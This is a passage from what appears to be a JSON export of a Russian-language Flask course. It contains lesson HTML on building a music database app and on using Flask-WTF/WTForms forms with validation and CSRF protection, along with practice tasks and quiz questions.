class=\"card-columns\"&gt;\r\n  &lt;div class=\"row\"&gt;\r\n    {% for song in songs %}\r\n    &lt;div class=\"col-md-3\"&gt;\r\n      &lt;div class=\"card mb-3\"&gt;\r\n        &lt;div class=\"card-header fw-bold\"&gt;\r\n          {{ song.title }}\r\n        &lt;/div&gt;\r\n        &lt;div class=\"card-body\"&gt;\r\n          &lt;p class=\"badge bg-primary text-wrap\"&gt;\r\n            {{ song.album.artist.name }}\r\n          &lt;/p&gt;\r\n          &lt;p class=\"card-text\"&gt;Альбом:\r\n            &lt;strong&gt;{{ song.album.title }}&lt;/strong&gt;\r\n          &lt;/p&gt;\r\n          &lt;p class=\"card-text\"&gt;\r\n            Длина: {{ song.length }} минут\r\n          &lt;/p&gt;\r\n          &lt;p class=\"card-text\"&gt;\r\n            Дата релиза: {{song.album.year}}\r\n          &lt;/p&gt;\r\n        &lt;/div&gt;\r\n      &lt;/div&gt;\r\n    &lt;/div&gt;\r\n    {% endfor %}\r\n  &lt;/div&gt;\r\n&lt;/div&gt;\r\n{% endblock %}</code></pre><p>&nbsp;</p><p><strong>10. Создание базы данных.</strong></p><p>Чтобы создать и заполнить базу, запустите файл <code>create_db.py</code> в активированном виртуальном окружении:</p><p><code>python create_db.py</code></p><p>Создастся поддиректория <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">instance</span> и в ней файл базы данных <span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\">music.db</span> .</p><p>&nbsp;</p><p><strong>11. Запустите приложение и перейдите по маршруту &nbsp;</strong><span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\"><code><strong>http://127.0.0.1:5000</strong></code></span></p><p>&nbsp;</p><p><strong>Итоговые замечания</strong></p><p>Приложение сознательно сделано упрощённым учебным, с рядом упрощений недопустимых в продакшене.</p><p>Ниже — структурированный разбор с явным указанием сознательных упрощений и конкретных направлений, как довести приложение до более профессионального уровня, не переписывая лекцию целиком.</p><p>&nbsp;</p><p>1. Ввести фабрику приложения</p><p>create_app()</p><p>Разделение конфигураций:</p><p>- development</p><p>- testing</p><p>- production</p><p>Результат</p><p>- Масштабируемость</p><p>- Тестируемость</p><p>- Чистая архитектура</p><p>&nbsp;</p><p>2. Убрать логику инициализации БД в CLI</p><p>(т.е. чтобы делать инициализацию запуском команд в терминале на \"боевом\" сервере)</p><p>&nbsp;</p><p>3. Валидация входных данных и проверка JSON-структуры</p><p>&nbsp;</p><p>4. Разделение слоёв</p><p>routes / services / repositories</p><p>Бизнес-логика вне маршрутов</p><p>&nbsp;</p><p>5. Логирование и обработка ошибок</p><p>&nbsp;</p>"
            },
            "is_published": true
        },
        {
            "id": 13,
            "section_id": 1,
            "number": 10,
            "name": "Flask-WTF и WTForms",
            "slug": "wt-forms",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p>Реализуй форму анкеты пользователя с полями:</p><p>имя</p><p>возраст (целое число)</p><p>согласие с условиями (checkbox)</p><p>Добавь проверку, что возраст находится в диапазоне от 18 до 100 лет, и согласие обязательно отмечено.</p>"
                    },
                    {
                        "id": 2,
                        "content": "<p>Создай форму с выпадающим списком (SelectField) выбора города.</p><p>Список должен содержать минимум три города.</p><p>После отправки формы выведи выбранный город на странице.</p>"
                    },
                    {
                        "id": 3,
                        "content": "<p>Реализуй предзаполнение формы:</p><p>при первом открытии страницы поля формы должны быть заполнены начальными значениями (например, Имя и Фамилия).</p>"
                    },
                    {
                        "id": 4,
                        "content": "<p>Создай форму обратной связи с текстовым полем сообщения.</p><p>Добавь ограничение длины сообщения (не менее 10 и не более 300 символов).</p><p>При нарушении ограничения пользователь должен увидеть понятное сообщение об ошибке.</p><p>Обязательно &nbsp;используй validate_on_submit().</p><p><span style=\"font-family:;\">Вся логика обработки формы полностью вынесена в отдельный файл</span></p>"
                    }
                ],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "Упрощение маршрутизации приложения",
                            "Генерация HTML-шаблонов без Jinja2",
                            "Интеграция WTForms с Flask, включая CSRF-защиту и валидацию данных ",
                            "Работа с базами данных напрямую"
                        ],
                        "question": "Что является основной задачей Flask-WTF при работе с формами во Flask?",
                        "correct_index": 2
                    },
                    {
                        "id": 2,
                        "options": [
                            "Он нужен для подключения Bootstrap",
                            "Он используется для генерации CSRF-токенов и подписи сессий ",
                            "Он определяет адрес сервера",
                            "Без него не работает render_template"
                        ],
                        "question": "Почему параметр SECRET_KEY обязателен при использовании Flask-WTF?",
                        "correct_index": 1
                    },
                    {
                        "id": 3,
                        "options": [
                            "Запускает валидацию формы и проверяет, что запрос был отправлен методом POST",
                            "Проверяет только наличие POST-запроса",
                            "Отправляет данные формы в базу данных",
                            "Рендерит HTML-шаблон"
                        ],
                        "question": "Какую задачу выполняет метод validate_on_submit() у формы Flask-WTF?",
                        "correct_index": 0
                    },
                    {
                        "id": 4,
                        "options": [
                            "Для добавления CSRF-токена и скрытых служебных полей ",
                            "Для вывода всех скрытых полей формы",
                            "Для автоматической генерации кнопки submit",
                            "Для генерации скрытых тэгов полей формы"
                        ],
                        "question": "Для чего в HTML-шаблоне необходимо вызывать {{ form.hidden_tag() }}?",
                        "correct_index": 0
                    },
                    {
                        "id": 5,
                        "options": [
                            "Как HTML-файл с полями формы",
                            "Как функция Flask с полями формы",
                            "Как JSON-структура с полями формы",
                            "Как Python-класс, наследующийся от FlaskForm "
                        ],
                        "question": "Как в WTForms описывается форма?",
                        "correct_index": 3
                    },
                    {
                        "id": 6,
                        "options": [
                            "HTML-код поля с данными",
                            "Исходные данные из request.form без изменений",
                            "Сообщение об ошибке валидации полей данных",
                            "Проверенное и типизированное значение поля формы "
                        ],
                        "question": "Что хранится в атрибуте form.field.data после успешной валидации?",
                        "correct_index": 3
                    },
                    {
                        "id": 7,
                        "options": [
                            "fieldValidator",
                            "fieldRequired ",
                            "DataRequired ",
                            "EqualTo"
                        ],
                        "question": "Какой валидатор используется для проверки обязательного заполнения поля?",
                        "correct_index": 2
                    }
                ],
                "theory_html": "<h4>Зачем вообще нужны Flask-WTF и WTForms</h4><p>HTML-Формы - ключевой механизм взаимодействия пользователя с web-приложением.</p><p>Формы обеспечивают ввод данных от пользователя и их использование в дальнейшей работе приложения, например, для изменения логики работы приложения или сохранения этих данных в базе данных и др.</p><p>Формы также обеспечивают:</p><p>- регистрация и авторизация</p><p>- отправка данных</p><p>- фильтрация и поиск</p><p>- обратная связь</p><p>- админ-панели</p><p>Сам по себе ввод данных пользователем в поля формы и даже нажатие кнопки Сохранить или Отправить не обеспечивает никакой функциональности обработки данных. Для этого должен быть какой то обработчик, какой то программный код работающий на сервере (на backend-е), где размещено приложение, который что то делает с этими данными. Одним из вариантов реализации подобной функциональности является Python backend фреймворк Flask.</p><p>&nbsp;</p><p>Проблемы «ручной» работы с формами во Flask.</p><p>Если использовать только request.form:</p><p>- нет централизованной валидации</p><p>- данные не типизированы</p><p>- много повторяющегося кода</p><p>- нет CSRF-защиты</p><p>- сложнее поддерживать и масштабировать проект</p><p>Flask-WTF + WTForms решают все эти проблемы.</p><p>&nbsp;</p><h4>Что такое WTForms и Flask-WTF</h4><p>WTForms:</p><p>Это библиотека Python, которая позволяет:</p><p>- описывать формы в виде классов</p><p>- описывать поля как атрибуты класса</p><p>- автоматически валидировать данные</p><p>- приводить типы данных</p><p>Flask-WTF:</p><p>Это расширение Flask, которое:</p><p>- интегрирует WTForms с Flask</p><p>- автоматически работает с request</p><p>- добавляет CSRF-защиту</p><p>- упрощает обработку форм</p><p>&nbsp;</p><h4>Создание минимального приложения с WTForms</h4><p>1. Установка.</p><p>Откройте новое окно терминала и выполните следующий код:</p><p><code>pip install flask-wtf</code></p><p>Объяснение:</p><p>- устанавливается flask-wtf</p><p>- автоматически подтягивается wtforms</p><p>- ничего дополнительно настраивать не нужно</p><p>После установки flask-wtf (и любой другой библиотеки/пакета) - перезагрузите VSCode.</p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">2. Минимальный код файла app.py с WTForms.</span></p><p><span style=\"color:black;\">Примечание.</span></p><p><span style=\"color:black;\">Для этого и последующих уроков, для простоты и уменьшения путаницы, можно удалить из папки шаблонов проекта templates все файлы, которые мы создавали на предыдущих уроках, кроме главной страницы index.html&nbsp; с навигационным меню, и базового шаблона base.html. А также можно удалить из главного файла приложения app.py все маршруты, кроме маршрута главной страницы и все импорты. Ниже мы пропишем всё с нуля.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">В главном файле приложения app.py, в начале файла сделайте все необходимые импорты:</span></p><pre><code class=\"language-python\">from flask import Flask\r\nfrom flask import render_template\r\nfrom forms import NameForm\r\n \r\napp = Flask(__name__)</code></pre><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">Добавьте создание секретного ключа:</span></p><p><span style=\"color:black;\"><code>app.config['SECRET_KEY'] = 'super-secret-key'</code></span></p><p><span style=\"color:black;\">Объяснение:</span></p><p><span style=\"color:black;\">SECRET_KEY — обязательный параметр</span></p><p><span style=\"color:black;\">используется для:</span></p><p><span style=\"color:black;\">- подписи сессий</span></p><p><span style=\"color:black;\">- CSRF-токенов</span></p><p><span style=\"color:black;\">без него Flask-WTF не будет работать</span></p><p><span style=\"color:black;\">ключ должен быть:</span></p><p><span style=\"color:black;\">сложным</span></p><p><span style=\"color:black;\">уникальным</span></p><p><span style=\"color:black;\">скрытым (в реальном проекте — через .env)</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">Далее в проекте оставляем маршрут главной страницы:</span></p><pre><code class=\"language-python\">@app.route(\"/\")\r\ndef index():\r\n &nbsp;&nbsp; return render_template(\"index.html\")</code></pre><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">И далее подключаем маршрут обработки формы:</span></p><pre><code class=\"language-python\">@app.route('/name/', methods=['GET', 'POST'])\r\ndef name():\r\n &nbsp;&nbsp; form = NameForm()\r\n \r\n &nbsp;&nbsp; if form.validate_on_submit():\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; name = form.name.data\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return f'Привет, {name}!'\r\n \r\n &nbsp;&nbsp; return render_template('name.html', form=form)</code></pre><p><span style=\"color:black;\">Объяснение:</span></p><p><code>methods=['GET', 'POST']</code></p><p><span style=\"color:black;\">GET — показ формы</span></p><p><span style=\"color:black;\">POST — отправка данных</span></p><p><code>form = NameForm()</code></p><p>Строка form = NameForm() создает конкретный объект формы на основе заранее определенного класса. Этот объект содержит в себе:</p><p>Поля: например, текстовое поле для ввода имени.</p><p>Методы валидации: правила, проверяющие, корректно ли заполнены данные.</p><p>Состояние: данные, которые пользователь ввел в браузере и отправил на сервер.</p><p><code>validate_on_submit()</code></p><p><span style=\"color:black;\">- проверяет, что запрос POST</span></p><p><span style=\"color:black;\">- запускает все валидаторы</span></p><p><span style=\"color:black;\">- возвращает True, если ошибок нет</span></p><p><code>form.name.data</code></p><p><span style=\"color:black;\">содержит уже проверенное значение</span></p><p><code>render_template()</code></p><p><span style=\"color:black;\">передаёт форму в шаблон</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">3. Создание файла формы, в котором будет непосредственно работать WTForms.</span></p><p><span style=\"color:black;\">В корне проекта создайте новый файл forms.py со следующим кодом:</span></p><pre><code class=\"language-python\">from flask_wtf import FlaskForm\r\nfrom wtforms import StringField, SubmitField\r\nfrom wtforms.validators import DataRequired\r\nclass NameForm(FlaskForm):\r\n &nbsp;&nbsp; name = StringField('Имя', validators=[DataRequired()])\r\n &nbsp;&nbsp; submit = SubmitField('Отправить')</code></pre><p><span style=\"color:black;\">Объяснение:</span></p><p><span style=\"color:black;\"><code>FlaskForm</code> — базовый класс всех форм</span></p><p><span style=\"color:black;\"><code>StringField</code> — текстовое поле ввода</span></p><p><span style=\"color:black;\">'Имя' — подпись поля (label)</span></p><p><span style=\"color:black;\"><code>DataRequired()</code></span></p><p><span style=\"color:black;\">- запрещает отправку пустого поля</span></p><p><span style=\"color:black;\">- автоматически добавляет сообщение об ошибке</span></p><p><span style=\"color:black;\"><code>SubmitField</code> — кнопка отправки формы</span></p><p><span style=\"color:black;\">Форма, с точки зрения Flask - это обычный Python-класс, а не HTML.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">4. HTML-шаблон формы</span></p><p><span style=\"color:black;\">Файл:<code> templates/name.html</code></span></p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}\r\n \r\n{% block content %}\r\n&lt;h1&gt;Введите имя&lt;/h1&gt;\r\n&lt;form method=\"post\"&gt;\r\n &nbsp;&nbsp; {{ form.hidden_tag() }}\r\n &nbsp;&nbsp; &lt;div&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {{ form.name.label }}&lt;br&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {{ form.name() }}\r\n &nbsp;&nbsp; &lt;/div&gt;\r\n &nbsp;&nbsp; &lt;div&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {{ form.submit() }}\r\n &nbsp;&nbsp; &lt;/div&gt;\r\n&lt;/form&gt;\r\n{% endblock %}</code></pre><p><span style=\"color:black;\">Подробное объяснение</span></p><p><span style=\"color:black;\"><code>{% extends 'base.html' %}</code></span></p><p><span style=\"color:black;\">шаблон наследует базовый макет</span></p><p><span style=\"color:black;\"><code>{% block content %}</code></span></p><p><span style=\"color:black;\">основной контент страницы</span></p><p><span style=\"color:black;\"><code>&lt;form method=\"post\"&gt;</code></span></p><p><span style=\"color:black;\">форма отправляется методом POST</span></p><p><span style=\"color:black;\"><code>form.hidden_tag()</code></span></p><p><span style=\"color:black;\">CSRF-токен и скрытые служебные поля</span></p><p><span style=\"color:black;\"><code>form.name.label</code></span></p><p><span style=\"color:black;\">выводит текст метки</span></p><p><span style=\"color:black;\"><code>form.name()</code></span></p><p><span style=\"color:black;\">автоматически генерирует &lt;input&gt;</span></p><p><span style=\"color:black;\"><code>form.submit()</code></span></p><p><span style=\"color:black;\">кнопка отправки</span></p><p>Внимание: Без hidden_tag() форма не пройдёт CSRF-проверку.</p><p>&nbsp;</p><p>5. В базовый шаблон templates/base.html добавьте пункт меню / ссылку на страницу формы:</p><pre><code class=\"language-html\">&lt;li&gt;\r\n  &lt;a href=\"{{ url_for('name') }}\"&gt;Форма&lt;/a&gt;\r\n&lt;/li&gt;</code></pre><p>&nbsp;</p><p>6. Запустите приложение.</p><p>С главной страницы перейдите на страницу формы и протестируйте работу формы.</p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">7. CSRF-защита.</span></p><p><span style=\"color:black;\">CSRF &nbsp;- это атака, при которой злоумышленник отправляет запрос от имени пользователя, используя его сессию.</span></p><p><span style=\"color:black;\">Как Flask-WTF защищает ?</span></p><p><span style=\"color:black;\">- при показе формы генерируется уникальный токен</span></p><p><span style=\"color:black;\">- токен сохраняется в сессии</span></p><p><span style=\"color:black;\">- при отправке формы токены сравниваются</span></p><p><span style=\"color:black;\">- при несовпадении — ошибка 400</span></p><p><span style=\"color:black;\">Защита включена по умолчанию.</span></p><p><span style=\"color:black;\">&nbsp;</span></p><h4>Сложная форма регистрации.</h4><p>создадим полноценную форму регистрации, которая позволяет разобрать:</p><p>архитектуру Flask-WTF</p><p>работу CSRF</p><p>серверную валидацию</p><p>разные типы полей WTForms</p><p>повторный рендер формы с ошибками</p><p>обработку данных без подключения базы данных</p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\">1. Создайте файл страницы формы регистрации templates/</span>registration<span style=\"color:black;\">.html</span></p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}\r\n \r\n{% block content %}\r\n&lt;h2&gt;Регистрация участника&lt;/h2&gt;\r\n \r\n&lt;form method=\"post\" enctype=\"multipart/form-data\"&gt;\r\n  {{ form.hidden_tag() }}\r\n  &lt;p&gt;\r\n    {{ form.username.label }}&lt;br&gt;\r\n    {{ form.username }}\r\n    {% for error in form.username.errors %}\r\n    &lt;span style=\"color:red\"&gt;{{ error }}&lt;/span&gt;\r\n    {% endfor %}\r\n  &lt;/p&gt;\r\n  &lt;p&gt;\r\n    {{ form.password.label }}&lt;br&gt;\r\n    {{ form.password }}\r\n  &lt;/p&gt;\r\n  &lt;p&gt;\r\n    {{ form.confirm_password.label }}&lt;br&gt;\r\n    {{ form.confirm_password }}\r\n  &lt;/p&gt;\r\n  &lt;p&gt;\r\n    {{ form.role.label }}&lt;br&gt;\r\n    {{ form.role }}\r\n  &lt;/p&gt;\r\n  &lt;p&gt;\r\n    {{ form.technologies.label }}&lt;br&gt;\r\n    {{ form.technologies }}\r\n  &lt;/p&gt;\r\n  &lt;p&gt;\r\n    {{ form.experience.label }}&lt;br&gt;\r\n    {{ form.experience }}\r\n  &lt;/p&gt;\r\n  &lt;p&gt;\r\n    {{ form.about.label }}&lt;br&gt;\r\n    {{ form.about }}\r\n  &lt;/p&gt;\r\n  &lt;p&gt;\r\n    {{ form.subscribe }} {{ form.subscribe.label }}\r\n  &lt;/p&gt;\r\n  &lt;p&gt;\r\n    {{ form.resume.label }}&lt;br&gt;\r\n    {{ form.resume }}\r\n  &lt;/p&gt;\r\n  &lt;p&gt;\r\n    {{ form.submit }}\r\n  &lt;/p&gt;\r\n&lt;/form&gt;\r\n \r\n{% if submitted_data %}\r\n&lt;hr&gt;\r\n&lt;h3&gt;Отправленные данные&lt;/h3&gt;\r\n&lt;pre&gt;{{ submitted_data }}&lt;/pre&gt;\r\n{% endif %}\r\n \r\n{% endblock %}</code></pre><p>&nbsp;объяснение файла <code>registration.html</code></p><p>Этот шаблон отвечает за отображение формы и ошибок валидации.</p><p><code>method=\"post\"</code> — отправка данных на сервер.</p><p><code>enctype=\"multipart/form-data\" </code>необходимо для работы с файлами.</p><p><code>hidden_tag()</code> вставляет CSRF-токен и служебные поля.</p><p>Вывод полей:</p><p>Каждое поле выводится через объект формы.</p><p>Ошибки конкретного поля отображаются рядом с ним.</p><p>Повторный рендер:</p><p>Если форма отправлена с ошибками, введённые значения сохраняются.</p><p>Пользователь не теряет введённые данные.</p><p>Отображение результата.</p><p>Блок submitted_data отображается только после успешной валидации и выводит принятые от пользователя данные.</p><p>Это замена сохранения данных в БД для учебных целей.</p><p>&nbsp;</p><p>2. Для этой формы напишем логику в файле forms.py.</p><p>Замените весь код на следующий:</p><pre><code class=\"language-python\">from flask_wtf import FlaskForm\r\nfrom wtforms import (\r\n &nbsp;&nbsp; StringField, PasswordField, TextAreaField,\r\n &nbsp;&nbsp; SelectField, SelectMultipleField,\r\n &nbsp;&nbsp; BooleanField, RadioField, FileField, SubmitField\r\n)\r\nfrom wtforms.validators import DataRequired, Length, EqualTo, ValidationError\r\n \r\nclass RegistrationForm(FlaskForm):\r\n &nbsp;&nbsp; username = StringField(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \"Имя пользователя\",\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; validators=[\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataRequired(message=\"Имя обязательно\"),\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Length(min=3, max=20)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ]\r\n &nbsp;&nbsp; )\r\n &nbsp;&nbsp; password = PasswordField(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \"Пароль\",\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; validators=[\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataRequired(),\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Length(min=6)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ]\r\n &nbsp;&nbsp; )\r\n &nbsp;&nbsp; confirm_password = PasswordField(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \"Повторите пароль\",\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; validators=[\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataRequired(),\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EqualTo(\"password\", message=\"Пароли не совпадают\")\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  ]\r\n &nbsp;&nbsp; )\r\n &nbsp;&nbsp; role = SelectField(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \"Роль участника\",\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; choices=[\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (\"student\", \"Студент\"),\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (\"teacher\", \"Преподаватель\"),\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (\"guest\", \"Гость\")\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ],\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; validators=[DataRequired()]\r\n &nbsp;&nbsp; )\r\n &nbsp;&nbsp; technologies = SelectMultipleField(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \"Используемые технологии\",\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; choices=[\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (\"flask\", \"Flask\"),\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (\"django\", \"Django\"),\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (\"fastapi\", \"FastAPI\"),\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (\"sqlalchemy\", \"SQLAlchemy\")\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ],\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; validators=[DataRequired()]\r\n &nbsp;&nbsp; )\r\n &nbsp;&nbsp; experience = RadioField(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \"Опыт разработки\",\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; choices=[\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (\"junior\", \"Junior\"),\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (\"middle\", \"Middle\"),\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (\"senior\", \"Senior\")\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ],\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; validators=[DataRequired()]\r\n &nbsp;&nbsp; )\r\n &nbsp;&nbsp; about = TextAreaField(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \"Кратко о себе\",\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; validators=[Length(max=300)]\r\n &nbsp;&nbsp; )\r\n \r\n &nbsp;&nbsp; subscribe = BooleanField(\"Подписаться на новости\")\r\n &nbsp;&nbsp; resume = FileField(\"Резюме (PDF, необязательно)\")\r\n &nbsp;&nbsp; submit = SubmitField(\"Отправить\")\r\n \r\n &nbsp;&nbsp; def validate_username(self, field):\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if \" \" in field.data:\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; raise ValidationError(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \"Имя пользователя не должно содержать пробелы\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )</code></pre><p>Объяснение файла <code>forms.py</code></p><p>Файл forms.py содержит всю логику формы и серверной валидации.</p><p>Импорты:</p><p>FlaskForm — базовый класс Flask-WTF, который автоматически:</p><p>связывает форму с текущим HTTP-запросом</p><p>добавляет CSRF-защиту</p><p>Поля WTForms определяют, какие данные ожидаются от пользователя.</p><p>Валидаторы отвечают за проверку корректности данных.</p><p>Класс RegistrationForm:</p><p>Наследование от FlaskForm обязательно для работы CSRF.</p><p>Каждый атрибут класса автоматически становится полем формы.</p><p>Текстовые и парольные поля</p><p>StringField и PasswordField создают соответствующие HTML-элементы.</p><p>DataRequired запрещает отправку пустых значений.</p><p>Length ограничивает длину строки на сервере.</p><p>Подтверждение пароля:</p><p>EqualTo(\"password\") сравнивает два поля формы.</p><p>Проверка происходит полностью на сервере, независимо от браузера.</p><p>Поля выбора:</p><p><code>SelectField</code> создаёт выпадающий список.</p><p><code>SelectMultipleField</code> позволяет выбрать несколько значений и возвращает список.</p><p><code>RadioField</code> создаёт группу радиокнопок, из которых можно выбрать только один вариант.</p><p>Дополнительные поля:</p><p><code>TextAreaField</code> используется для многострочного текста.</p><p><code>BooleanField</code> возвращает True или False.</p><p><code>FileField</code> предоставляет доступ к загруженному файлу, но не сохраняет его автоматически.</p><p>Кастомная валидация:</p><p>Метод validate_username вызывается автоматически.</p><p>Если возникает ValidationError, форма считается невалидной, а сообщение ошибки привязывается к конкретному полю.</p><p>&nbsp;</p><p>3. Код файла app.py замените на следующий:</p><pre><code class=\"language-python\">from flask import Flask, render_template\r\nfrom forms import RegistrationForm\r\n \r\napp = Flask(__name__)\r\n \r\napp.config[\"SECRET_KEY\"] = \"dev-secret-key\"\r\n \r\n@app.route(\"/\")\r\ndef index():\r\n    return render_template(\"index.html\")\r\n \r\n@app.route(\"/register\", methods=[\"GET\", \"POST\"])\r\ndef register():\r\n    form = RegistrationForm()\r\n    submitted_data = None\r\n \r\n    if form.validate_on_submit():\r\n        submitted_data = {\r\n            \"username\": form.username.data,\r\n            \"role\": form.role.data,\r\n            \"technologies\": form.technologies.data,\r\n            \"experience\": form.experience.data,\r\n            \"subscribe\": form.subscribe.data,\r\n            \"about\": form.about.data\r\n        }\r\n \r\n    return render_template(\r\n        \"registration.html\",\r\n        form=form,\r\n        submitted_data=submitted_data\r\n    )\r\n \r\nif __name__ == \"__main__\":\r\n    app.run(debug=True)</code></pre><p>&nbsp;объяснение файла app.py</p><p>Файл app.py отвечает за инициализацию Flask-приложения и обработку HTTP-запросов.</p><p>SECRET_KEY обязателен для:</p><p>работы CSRF-токенов</p><p>защиты формы от подделки запросов</p><p>Маршрут /register</p><p>Один маршрут обрабатывает сразу два метода:</p><p>GET — отображение формы</p><p>POST — обработка отправленных данных</p><p>Экземпляр формы:</p><p>При создании RegistrationForm() данные автоматически берутся из request.</p><p>Форма готова как к отображению, так и к валидации.</p><p><code>validate_on_submit()</code></p><p>- Проверяет, что запрос — POST</p><p>- Проверяет CSRF-токен</p><p>- Запускает все валидаторы формы</p><p>Если есть хотя бы одна ошибка, код внутри блока не выполняется.</p><p>Обработка данных:</p><p>Данные формы считываются через .data.</p><p>В учебном примере данные не сохраняются, а просто передаются в шаблон.</p><p>Рендер шаблона:</p><p>В шаблон передаётся:</p><p>- объект формы</p><p>- данные, если форма прошла валидацию</p><p>Это позволяет повторно отрисовать форму с ошибками или результатом.</p><p>&nbsp;</p><p>4. Добавьте ссылку на страницу registration.html в базовый шаблон:</p><pre><code class=\"language-html\">&lt;li&gt;\r\n  &lt;a href=\"{{ url_for('register') }}\"&gt;Регистрация&lt;/a&gt;\r\n&lt;/li&gt;  </code></pre><p>&nbsp;</p><p>5. Запустите приложения и тщательно протестируйте форму вводя различные данные, правильные и неправильные.</p><p><span style=\"color:black;\">&nbsp;</span></p><p><span style=\"color:black;\"><strong>Итоги</strong></span></p><p><span style=\"color:black;\">Flask-WTF:</span></p><p><span style=\"color:black;\">- стандартизирует работу с формами</span></p><p><span style=\"color:black;\">- повышает безопасность</span></p><p><span style=\"color:black;\">- упрощает валидацию</span></p><p><span style=\"color:black;\">- делает код чище</span></p><p><span style=\"color:black;\">- отлично масштабируется</span></p><p><span style=\"color:black;\">Это обязательный инструмент для любого серьёзного Flask-проекта</span></p><p><span style=\"color:black;\">&nbsp;</span></p>"
            },
            "is_published": true
        },
        {
            "id": 8,
            "section_id": 1,
            "number": 5,
            "name": "Обработка форм",
            "slug": "forms",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Добавьте в существующую форму HTML-валидацию с помощью атрибутов required, type=\"email\" и minlength, и проверьте их работу в браузере.</span></span></p>"
                    }
